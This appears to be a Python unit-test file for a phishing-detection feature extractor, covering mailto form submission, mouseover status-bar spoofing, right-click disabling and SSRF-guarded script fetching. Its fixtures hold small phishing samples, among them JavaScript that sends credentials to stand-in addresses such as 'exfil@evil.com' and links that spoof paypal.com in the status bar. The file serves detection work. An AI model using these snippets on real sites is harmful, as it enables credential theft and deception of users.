"""
Focused automated unit tests for Section 4 Features:
- Submitting_to_email (Position 16)
- on_mouseover (Position 19)
- RightClick (Position 20)
and their shared JavaScript collection, caching, and SSRF security helpers.
"""

import unittest
from unittest.mock import MagicMock
import sys
import os

# Ensure project root is in sys.path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from src.feature_contract import ALLOWED_VALUES
from src.feature_extractor import (
    extract_inline_javascript,
    extract_external_script_urls,
    fetch_external_javascript,
    collect_javascript_sources,
    extract_submitting_to_email,
    extract_on_mouseover,
    extract_right_click,
    _is_safe_url_destination,
    _strip_javascript_comments,
    _has_js_mailto_submission,
    _has_status_bar_manipulation,
    _has_mouseover_status_manipulation,
    _has_right_click_disabling,
)


class TestSection4Features(unittest.TestCase):

    # --------------------------------------------------------------------------
    # 1. Shared Helpers and Network Safety Tests
    # --------------------------------------------------------------------------

    def test_strip_javascript_comments(self):
        code = """
        // mailto:hacker@evil.com
        /* window.status = 'fake'; */
        let x = 10; // if (e.button == 2) return false;
        let s = "http://legit.com // not a comment";
        """
        cleaned = _strip_javascript_comments(code)
        self.assertNotIn("hacker@evil.com", cleaned)
        self.assertNotIn("fake", cleaned)
        self.assertNotIn("return false", cleaned)
        self.assertIn("let x = 10;", cleaned)
        self.assertIn("not a comment", cleaned)

    def test_extract_inline_javascript(self):
        html = """
        <html>
        <head>
          <script>var x = 10;</script>
          <script src="/external.js"></script>
        </head>
        <body>
          <a href="#" onmouseover="window.status='hi';">Hover</a>
          <button onclick="doSomething()">Click</button>
        </body>
        </html>
        """
        data = extract_inline_javascript(html)
        self.assertEqual(len(data["scripts"]), 1)
        self.assertIn("var x = 10;", data["scripts"][0])
        self.assertEqual(len(data["event_handlers"]), 2)
        handlers = {h["attr"]: h["code"] for h in data["event_handlers"]}
        self.assertIn("onmouseover", handlers)
        self.assertIn("onclick", handlers)

    def test_extract_external_script_urls(self):
        html = """
        <html>
        <head>
          <script src="/assets/app.js"></script>
          <script src="https://cdn.example.com/lib.js"></script>
          <script src="//code.jquery.com/jquery.js"></script>
          <script src=""></script>
          <script>inline code</script>
        </head>
        </html>
        """
        urls = extract_external_script_urls(html, "https://example.com/page")
        self.assertIn("https://example.com/assets/app.js", urls)
        self.assertIn("https://cdn.example.com/lib.js", urls)
        self.assertIn("https://code.jquery.com/jquery.js", urls)
        self.assertEqual(len(urls), 3)

    def test_safe_url_destination_ssrf_protection(self):
        # Localhost, private IPs must be rejected
        self.assertFalse(_is_safe_url_destination("http://localhost/script.js"))
        self.assertFalse(_is_safe_url_destination("http://127.0.0.1/script.js"))
        self.assertFalse(_is_safe_url_destination("http://192.168.1.1/script.js"))
        self.assertFalse(_is_safe_url_destination("http://10.0.0.1/script.js"))
        self.assertFalse(_is_safe_url_destination("ftp://example.com/script.js"))
        # Public domain
        self.assertTrue(_is_safe_url_destination("https://cdn.example.com/script.js"))

    def test_fetch_external_javascript_mock(self):
        mock_session = MagicMock()
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.headers = {"Content-Type": "application/javascript"}
        mock_resp.encoding = "utf-8"
        mock_resp.iter_content.return_value = [b"console.log('loaded');"]
        mock_session.get.return_value = mock_resp

        code = fetch_external_javascript("https://cdn.example.com/app.js", session=mock_session)
        self.assertEqual(code, "console.log('loaded');")

    def test_fetch_external_javascript_prohibited_and_oversized(self):
        # 1. Prohibited private destination
        code = fetch_external_javascript("http://127.0.0.1/evil.js")
        self.assertIsNone(code)

        # 2. Oversized response (>1MB)
        mock_session = MagicMock()
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.headers = {"Content-Type": "application/javascript"}
        mock_resp.iter_content.return_value = [b"a" * (1024 * 1024 + 10)]
        mock_session.get.return_value = mock_resp

        code_large = fetch_external_javascript("https://cdn.example.com/huge.js", session=mock_session)
        self.assertIsNone(code_large)

    def test_fetch_external_javascript_network_failure_and_404(self):
        # 1. 404 response
        mock_session = MagicMock()
        mock_resp = MagicMock()
        mock_resp.status_code = 404
        mock_resp.headers = {"Content-Type": "text/html"}
        mock_session.get.return_value = mock_resp
        code_404 = fetch_external_javascript("https://cdn.example.com/missing.js", session=mock_session)
        self.assertIsNone(code_404)

        # 2. Network exception
        mock_session_err = MagicMock()
        mock_session_err.get.side_effect = Exception("Connection refused")
        code_err = fetch_external_javascript("https://cdn.example.com/err.js", session=mock_session_err)
        self.assertIsNone(code_err)

    # --------------------------------------------------------------------------
    # 2. Submitting_to_email (Position 16) Tests
    # --------------------------------------------------------------------------

    def test_submitting_to_email_form_action(self):
        # Standard <form action="mailto:..."> -> -1
        html = '<form action="mailto:attacker@phish.com"><input type="text"></form>'
        res = extract_submitting_to_email(html, "https://example.com")
        self.assertEqual(res, -1)
        self.assertIn(res, ALLOWED_VALUES["Submitting_to_email"])

        # Form action with leading whitespace -> -1
        html_ws = '<form action="   mailto:attacker@phish.com"><input type="text"></form>'
        self.assertEqual(extract_submitting_to_email(html_ws, "https://example.com"), -1)

        # Submit button with formaction="mailto:..." -> -1
        html_btn = '<form action="/process.php"><button formaction="mailto:attacker@phish.com">Send</button></form>'
        self.assertEqual(extract_submitting_to_email(html_btn, "https://example.com"), -1)

    def test_submitting_to_email_ordinary_form_returns_1(self):
        # Normal form submission without mailto -> 1
        html_normal = '<form action="/submit.php" method="POST"><input type="text" name="user"></form>'
        self.assertEqual(extract_submitting_to_email(html_normal, "https://example.com"), 1)

    def test_submitting_to_email_plain_contact_link_returns_1(self):
        # Plain contact link (<a href="mailto:...">) is an email link, not a submission mechanism -> 1
        html = '<a href="mailto:support@legitcompany.com">Contact Support</a>'
        self.assertEqual(extract_submitting_to_email(html, "https://example.com"), 1)

        # Plain email link with subject
        html_subj = '<a href="mailto:info@domain.com?subject=Inquiry">Email Us</a>'
        self.assertEqual(extract_submitting_to_email(html_subj, "https://example.com"), 1)

    def test_submitting_to_email_inline_javascript_submission(self):
        # Dynamic form action setting -> -1
        html_action = """
        <script>
          function submitCredentials() {
            document.forms[0].action = "mailto:exfil@evil.com";
            document.forms[0].submit();
          }
        </script>
        """
        self.assertEqual(extract_submitting_to_email(html_action, "https://example.com"), -1)

        # Navigation forwarding data via mailto -> -1
        html_nav = """
        <script>
          function sendStolenData(data) {
            window.location.href = "mailto:hacker@evil.com?body=" + data;
          }
        </script>
        """
        self.assertEqual(extract_submitting_to_email(html_nav, "https://example.com"), -1)

    def test_submitting_to_email_inline_event_handler(self):
        # Form submit button dynamically setting mailto in onclick handler -> -1
        html = '<button onclick="this.form.action=\'mailto:hacker@evil.com\'; this.form.submit();">Submit</button>'
        self.assertEqual(extract_submitting_to_email(html, "https://example.com"), -1)

    def test_submitting_to_email_external_javascript(self):
        html = '<script src="https://cdn.example.com/submit.js"></script>'
        mock_session = MagicMock()
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.headers = {"Content-Type": "application/javascript"}
        mock_resp.encoding = "utf-8"
        mock_resp.iter_content.return_value = [
            b"function exfil(cred) { window.location.href = 'mailto:hacker@evil.com?body=' + cred; }"
        ]
        mock_session.get.return_value = mock_resp

        res = extract_submitting_to_email(html, "https://example.com", session=mock_session)
        self.assertEqual(res, -1)

    def test_submitting_to_email_comments_and_unused_strings_return_1(self):
        # Comment mentioning mailto -> 1
        html_comment = """
        <script>
          // Send feedback to mailto:support@example.com
          /* TODO: remove old mailto:developer@company.org reference */
          var x = 1;
        </script>
        """
        self.assertEqual(extract_submitting_to_email(html_comment, "https://example.com"), 1)

        # Unused variable string mentioning mailto -> 1
        html_str = """
        <script>
          const contactLink = "mailto:info@site.com";
          console.log("Welcome");
        </script>
        """
        self.assertEqual(extract_submitting_to_email(html_str, "https://example.com"), 1)

    # --------------------------------------------------------------------------
    # 3. on_mouseover (Position 19) Tests
    # --------------------------------------------------------------------------

    def test_on_mouseover_inline_attribute_modifies_status(self):
        # Inline onmouseover modifying window.status -> -1
        html = '<a href="http://evil.com" onmouseover="window.status=\'http://paypal.com\'; return true;">Login</a>'
        res = extract_on_mouseover(html, "https://example.com")
        self.assertEqual(res, -1)
        self.assertIn(res, ALLOWED_VALUES["on_mouseover"])

        # Inline onmouseover with status = '...' -> -1
        html2 = '<a href="http://evil.com" onmouseover="status=\'http://paypal.com\'; return true;">Login</a>'
        self.assertEqual(extract_on_mouseover(html2, "https://example.com"), -1)

    def test_on_mouseover_inline_script_listener_modifies_status(self):
        # addEventListener('mouseover', function(...) { window.status = ... }) -> -1
        html_listener = """
        <script>
          const link = document.getElementById("link");
          link.addEventListener('mouseover', function(e) {
            window.status = 'https://trusted-bank.com';
            return true;
          });
        </script>
        """
        self.assertEqual(extract_on_mouseover(html_listener, "https://example.com"), -1)

        # element.onmouseover = () => { window.status = ... } -> -1
        html_prop = """
        <script>
          link.onmouseover = () => {
            window.status = "https://legit.com";
          };
        </script>
        """
        self.assertEqual(extract_on_mouseover(html_prop, "https://example.com"), -1)

    def test_on_mouseover_external_javascript(self):
        html = '<script src="https://cdn.example.com/hover.js"></script>'
        mock_session = MagicMock()
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.headers = {"Content-Type": "application/javascript"}
        mock_resp.encoding = "utf-8"
        mock_resp.iter_content.return_value = [
            b"element.addEventListener('mouseover', function(e) { window.status = 'https://bank.com'; });"
        ]
        mock_session.get.return_value = mock_resp

        res = extract_on_mouseover(html, "https://example.com", session=mock_session)
        self.assertEqual(res, -1)

    def test_on_mouseover_unrelated_style_returns_1(self):
        # Inline onmouseover that changes styling or tooltips -> 1
        html = '<div onmouseover="this.style.color=\'red\';">Hover Me</div>'
        self.assertEqual(extract_on_mouseover(html, "https://example.com"), 1)

    def test_on_mouseover_unrelated_status_and_mouseover_in_separate_code_returns_1(self):
        # Mouseover listener without status change, and an unrelated status assignment 500 lines away -> 1
        html = """
        <script>
          element.addEventListener('mouseover', function() {
            showTooltip();
          });

          // Unrelated logic far away
          function updateSystemState() {
            window.status = "System Ready";
          }
        </script>
        """
        self.assertEqual(extract_on_mouseover(html, "https://example.com"), 1)

    def test_on_mouseover_local_status_variable_returns_1(self):
        # Local variable named status -> 1
        html = """
        <script>
          var status = "SUCCESS";
          let status_flag = 1;
          console.log("Status: " + status);
        </script>
        """
        self.assertEqual(extract_on_mouseover(html, "https://example.com"), 1)

    def test_on_mouseover_commented_code_returns_1(self):
        # Commented-out mouseover status spoofing -> 1
        html = """
        <script>
          // link.onmouseover = function() { window.status = 'fake'; };
          /* onmouseover="window.status='spoofed'" */
        </script>
        """
        self.assertEqual(extract_on_mouseover(html, "https://example.com"), 1)

    # --------------------------------------------------------------------------
    # 4. RightClick (Position 20) Tests
    # --------------------------------------------------------------------------

    def test_right_click_inline_event_handler(self):
        # onmousedown checking event.button == 2 and disabling -> -1
        html = '<body onmousedown="if (event.button == 2) { alert(\'Disabled\'); return false; }">'
        res = extract_right_click(html, "https://example.com")
        self.assertEqual(res, -1)
        self.assertIn(res, ALLOWED_VALUES["RightClick"])

        # compact: if(event.button==2)return false;
        html_compact = '<body onmousedown="if(event.button==2)return false;">'
        self.assertEqual(extract_right_click(html_compact, "https://example.com"), -1)

    def test_right_click_inline_script_variations(self):
        # Whitespace / formatting variations: event.button == 2 and e.preventDefault() -> -1
        html = """
        <script>
          function clickCheck(event) {
            if (event.button === 2) {
              event.preventDefault();
              return false;
            }
          }
        </script>
        """
        self.assertEqual(extract_right_click(html, "https://example.com"), -1)

        # e.button == 2 with cancelBubble
        html_bubble = """
        <script>
          document.addEventListener('mousedown', function(evt) {
            if (evt.button == 2) {
              evt.cancelBubble = true;
            }
          });
        </script>
        """
        self.assertEqual(extract_right_click(html_bubble, "https://example.com"), -1)

        # Single statement without braces: if (e.button == 2) return false;
        html_single = """
        <script>
          function onDown(e) {
            if (e.button == 2) return false;
          }
        </script>
        """
        self.assertEqual(extract_right_click(html_single, "https://example.com"), -1)

    def test_right_click_external_javascript(self):
        html = '<script src="https://cdn.example.com/protect.js"></script>'
        mock_session = MagicMock()
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.headers = {"Content-Type": "application/javascript"}
        mock_resp.encoding = "utf-8"
        mock_resp.iter_content.return_value = [
            b"document.onmousedown = function(e) { if(e.button == 2) return false; };"
        ]
        mock_session.get.return_value = mock_resp

        res = extract_right_click(html, "https://example.com", session=mock_session)
        self.assertEqual(res, -1)

    def test_right_click_condition_without_disabling_returns_1(self):
        # event.button == 2 checked for logging only, not disabling -> 1
        html = """
        <script>
          function onAny(event) {
            if (event.button == 2) {
              console.log("User right clicked");
            }
          }
        </script>
        """
        self.assertEqual(extract_right_click(html, "https://example.com"), 1)

    def test_right_click_unrelated_return_false_returns_1(self):
        # Condition checks button == 2 (non-disabling), but unrelated return false occurs elsewhere -> 1
        html = """
        <script>
          function handleClick(e) {
            if (e.button == 2) {
              trackAnalytics("right_click");
            }
            // Unrelated validation at bottom
            return false;
          }
        </script>
        """
        self.assertEqual(extract_right_click(html, "https://example.com"), 1)

    def test_right_click_generic_contextmenu_returns_1(self):
        # Generic contextmenu without event.button == 2 condition -> 1
        html = '<body oncontextmenu="return false;">'
        self.assertEqual(extract_right_click(html, "https://example.com"), 1)

        html_listener = """
        <script>
          document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
          });
        </script>
        """
        self.assertEqual(extract_right_click(html_listener, "https://example.com"), 1)

    def test_right_click_button_0_returns_1(self):
        # Left click (button == 0) disabled should not be flagged -> 1
        html = """
        <script>
          function onLeft(event) {
            if (event.button == 0) {
              return false;
            }
          }
        </script>
        """
        self.assertEqual(extract_right_click(html, "https://example.com"), 1)

    def test_right_click_commented_code_returns_1(self):
        # Commented out right-click disabling -> 1
        html = """
        <script>
          // if (event.button == 2) return false;
          /* document.onmousedown = function(e) { if (e.button == 2) return false; }; */
        </script>
        """
        self.assertEqual(extract_right_click(html, "https://example.com"), 1)

    # --------------------------------------------------------------------------
    # 5. Empty HTML and Malformed Input Tests
    # --------------------------------------------------------------------------

    def test_empty_and_malformed_html(self):
        for empty_val in ("", None):
            self.assertEqual(extract_submitting_to_email(empty_val, "https://example.com"), 1)
            self.assertEqual(extract_on_mouseover(empty_val, "https://example.com"), 1)
            self.assertEqual(extract_right_click(empty_val, "https://example.com"), 1)

        malformed = "<<<not valid html>>><script>///"
        self.assertEqual(extract_submitting_to_email(malformed, "https://example.com"), 1)
        self.assertEqual(extract_on_mouseover(malformed, "https://example.com"), 1)
        self.assertEqual(extract_right_click(malformed, "https://example.com"), 1)


if __name__ == "__main__":
    unittest.main()
